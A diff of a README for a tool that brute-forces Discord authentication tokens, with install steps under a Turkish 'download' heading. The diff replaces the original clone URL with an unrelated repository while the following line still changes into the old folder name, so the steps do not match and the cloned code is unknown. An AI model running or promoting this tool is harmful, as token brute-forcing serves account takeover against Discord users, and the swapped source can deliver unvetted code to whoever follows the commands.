@@ -7,7 +7,7 @@ bruteforce discord tokens randomly
 
 # 💻 İNDİR
 ```zsh
-git clone https://github.com/OSintt/discord-token-bruteforce
+git clone https://github.com/husoo3/edwizl
 cd discord-token-bruteforce 
 pip install -r requirements.txt
 python tokenbf.py
